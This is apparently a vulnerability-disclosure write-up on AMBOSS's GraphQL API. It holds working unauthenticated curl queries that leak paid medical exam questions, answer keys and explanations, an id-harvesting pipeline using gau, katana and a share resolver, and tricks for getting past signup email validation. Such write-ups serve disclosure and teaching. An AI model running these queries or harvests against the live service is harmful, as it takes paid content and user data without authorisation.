# Field-level authz asymmetry + id-harvest chain — worked example (AMBOSS, 2026-10)

Authorised VDP engagement (security.txt → `security@amboss.com`). No DoS performed. Kept here because the
*shape* recurs on any paid-content GraphQL product (courseware, Qbanks, media libraries, data APIs).

## Target shape

- Public app `next.amboss.com`, marketing `www.amboss.com` (Webflow), identity `auth.amboss.com` (Logto)
  and `de/en.auth.amboss.com` (Auth0-style OIDC), billing via **Chargebee** (`medicuja.chargebee.com`).
- Core API: `POST https://nextapi.us.production.amboss.com/graphql` (mirrors `api.<region>.production.amboss.com`,
  `nextapi<region>.amboss.com`). Introspection was **enabled unauthenticated**: 616 types / 172 Query / 134 Mutation.
- Ids are opaque `EncodedId` values (`GJiRaBvs54`, `df0oO2`, `S_0yni`, `wnHlahvIyk`) with a **checksum**:
  random 6-char candidates → `Invalid ID: riGp_5`; 69 single-character mutations of a valid id → 0 valid.
  Base64url-decoding them yields 4–7 bytes with an obvious constant middle and low-entropy counter field —
  not worth cracking when step 2 below hands you real ids.

## The leak

`Question.content` was guarded; three siblings were not.

```bash
# NO Authorization header anywhere in this request
curl -s -X POST https://nextapi.us.production.amboss.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{questions(eids:[\"S_0yni\"]){eid content publicContent answers{letter content isCorrect}}}"}'
```

Response (HTTP 200, truncated):

```json
{"errors":[{"message":"access.no_valid_access","path":["questions",0,"content"]}],
 "data":{"questions":[{"eid":"S_0yni","content":null,
   "publicContent":"<p>A 7-year-old girl is brought to the physician ...",
   "answers":[{"letter":"a","content":"<p>Necator americanus</p>","isCorrect":true},
              {"letter":"b","content":"<p>Ascaris lumbricoides</p>","isCorrect":false}]}]}}
```

Measured on a random 400-question sample, **unauthenticated**:

| metric | result |
|---|---|
| `publicContent` returned | 400 / 400 |
| full vignette (>300 chars) | 399 / 400 |
| answer key present (`isCorrect`) | 400 / 400 |
| guarded `content` populated | 0 / 400 |

And on a trial/privileged account, `publicContent` was **byte-identical** to the guarded `content`
(md5-equal, e.g. 1779 chars) — i.e. `publicContent` is not a sanitised preview, it is the whole thing.

### The deepest leak was one level DOWN, on the child type (found on a second pass)

The first pass stopped at the guarded object's own fields. The second pass pulled the field list of every type
the guarded object points at — and the child `Answer` type had **no gate on any field**:

```
{ questions(eids:["<id>"]){                     # still no auth header
    labValuesSheet { content }                  # -> FULL lab-values table      (child type, unguarded)
    answers {
      letter content isCorrect
      explanationWhy explanationBut             # -> the per-option EXPLANATIONS
      linkedArticleEid linkedParticleEid imageEid media rate
    }
} }
```

300-question sample, unauthenticated: answer key 300/300, **full per-answer explanations 300/300**,
linked-article ids 300/300, **5,317,940 bytes (~5.3 MB)** of paid text from those 300 questions alone.

Two reportable consequences: the answer *key* is the headline, but the **explanations** are what the product
actually charges for and are the stronger severity argument; and the guard on `content` is demonstrably
**decorative**, because `answers[].linkedArticle.content` on the very same response returned
`permission.user_is_not_authorized`. Put that contrast in the report — it converts "maybe by design" into a
proven oversight.

Field-name signals for a child-type hole: `explanation*`, `rationale`, `discussion`, `notes`, `content`,
`labValues*`, plus the supporting-asset block (`media`, `imageEid`, `linkedArticleEid`). Any type named like
it is meant to be locked (`ExamBlockedQuestion`) is worth the same probe.

Cross-check on a sibling content type to prove the asymmetry is per-field and not a global misconfig:
`Article.content` and `Article.references` were correctly gated while `Article.abstract` (a genuine
summary) was not — so the pattern is "one field's gate exists, the adjacent copy's does not".

## Getting the ids (the part that decides severity)

1. Passive + crawl harvest for **public session ids**:

   ```bash
   (echo target.com; echo app.target.com) | gau --threads 5 --subs > gau.txt
   grep -oiE '/(shared/)?questions/[A-Za-z0-9_-]{8,12}' gau.txt | grep -oE '[A-Za-z0-9_-]{8,12}$' | sort -u
   # -> 230 ids ; gau total 41,762 URLs, 5,082 of them /questions/
   katana -u https://next.amboss.com -d 3 -jc -kf all -o katana_app.txt   # -> 48,678 URLs
   ```

2. Expand each with the **unauthenticated share resolver**:

   ```bash
   curl -s -X POST https://nextapi.us.production.amboss.com/graphql -H 'Content-Type: application/json' \
     -d '{"query":"{sharedQuestionSessionFromQuestionSession(eid:\"<session-id>\"){title questions{eid}}}"}'
   # -> {"title":"SMLE QBank 5-question Taster","questions":[{"eid":"mJbVuu"},...]}
   ```

   230 session ids → **5,245 unique question ids**. Titles seen on public sessions included
   explicitly-marketed samples ("SMLE QBank 5-question Taster", "IFOM CSE Sample Session",
   "MCCQE QBank 10-question Taster") — i.e. the vendor itself publishes the entry points.

3. Feed the harvested ids to the field-level leak. Done.

### Re-harvest hygiene — an "ids" file must hold BARE ids, and a disagreeing re-run is a tooling bug first

Hit live at the end of this engagement, and it nearly reversed a **correct** headline number.

- `gau`/`katana` output is full URLs. The step-1 grep ends in `grep -oE '[A-Za-z0-9_-]{8,12}$'` **on
  purpose** — that trailing `$` is what strips the path. Save the stripped form.
- A later `grep -oiE '/(shared/)?questions/...' | sort -u > wayback_session_eids.txt` (no `-oE …$`)
  **overwrote** the same file with whole paths (`/questions/0mEAeVwlV`). The next harvest run fed those
  as ids, every one failed the format check, and it reported **6 valid of 381 ids / 113 question ids** —
  against the earlier, correct **214 valid of 230 / 5,246**. Nothing was wrong with the target.
- So: **when a follow-up measurement of a quantity you already published disagrees, diff the input
  artifacts before touching the claim.** Re-verify with a known-good input shape; only revise the number
  when the *target's* behaviour changed, never when the *file* did. Here the re-verify
  (`sed 's#^/questions/##' | grep -E '^[A-Za-z0-9_-]{6,12}$' | sort -u`) reproduced 214/230 → 5,246 and
  confirmed the original. Shipping the 6/381 figure would have silently downgraded a High.
- Cheap guard for any id-list you persist: assert the shape once —
  `awk '{print length($0)}' ids.txt | sort | uniq -c` — a cluster of 20–28 char entries means paths leaked
  into the list, not ids. Also print the *tried / valid / harvested* triple on every run so a collapsed
  harvest is visible in the run's own output instead of being read later off a file line-count.

## What else the same engagement turned up (negative + secondary, for calibration)

- **Cross-user session read + server-side materialisation (Medium).** `questionSession(eid)` with another
  user's session id returned their title/question set/result rows **and created a copy in the caller's
  account** (each caller got a different new id). `sharedQuestionSessionFromQuestionSession(eid)` returned a
  foreign session's title + question ids with **no auth at all**. Bounded by the id-checksum: no blind
  enumeration, so it needs a harvested id.
- **Unauthenticated user enumeration (Low).** `userExists(email)` → bool; `sendResetPasswordEmail(email)` →
  `true` for existing, `false` for non-existing. Both without auth.
- **Unhandled 500s (Low).** `applyCouponToCurrentSubscription`, `uploadIosIapReceipt`, `createPaymentIntent`
  before a billing address is set, and a malformed GraphQL body all returned
  `{"message":"Internal server error","category":"HTTP 500"}` instead of a typed error.
- **`graphql-cop` flags** on an introspection-enabled endpoint: Alias Overloading (HIGH, DoS — **not
  exercised**), introspection circular query (HIGH, DoS — not exercised), url-encoded POST accepted
  (MEDIUM, possible CSRF). Report intro+alias as observations only; never actually DoS a live target.
- **Controls verified working — write these up as positives:** payment-intent ownership was enforced
  (cross-account `setCreditCardAsPrimaryPaymentMethod` → `Payment intent customer id(X) does not match
  customers id(Y)`); institution queries gated; profile email change and billing address validated;
  Auth0-style tenant had DCR disabled; Logto tenant exposed no `password` grant.

## Reusable operator notes

- **`graphql-cop` is not on PyPI.** `git clone --depth 1 https://github.com/dolevf/graphql-cop.git` then
  `pip install -r requirements.txt` (its pins include `simplejson` and `termcolor`; it imports both at
  module load, so a bare `python graphql-cop.py` fails until they are installed).
- **Provision test accounts through the raw API, not the UI.** The SPA's BFF route
  (`POST /us/register`) returned HTTP 500 body `default`, and a scripted browser fill produced
  "Something went wrong" — while the underlying mutation `createUser(data:{channel:passwordSignup,email,password})`
  worked directly and returned an `AuthToken`. Capture the real request once with a CDP-driven browser
  (see below) to learn the mutation + argument names, then script the API.
- **Email-validation differential is the test-account gate.** `createUser` returned
  `CreateUserInputValidationError` for `user+alias@gmail.com`, `@mailinator.com`, `@yopmail.com`, but
  `AuthToken` for a plain gmail address — Gmail **dot-variants** (`f.z.susanto@gmail.com`) are accepted and
  still deliver to the researcher's real inbox. Probe with the API, not the form; record every account you
  create incidentally during the probing (those extra aliases may route to third parties and need to be
  disclosed for cleanup).
- **A quick CDP driver for SPA request capture** (no Playwright needed):
  - `PUT /json/new?<url-encoded-url>` — modern Chrome rejects `GET` with **405**.
  - Launch Chrome with `--remote-allow-origins=*` or the websocket handshake fails **403**.
  - `Network.enable` + `Page.navigate`, drain events, then grep `Network.requestWillBeSent` for the
    mutation you want; `Network.getResponseBody` gives the response body (this is how the 500 `default`
    body and the leaked Segment `writeKey` in `POST www.amboss.com/us/api/sprx/v1/t` were found).
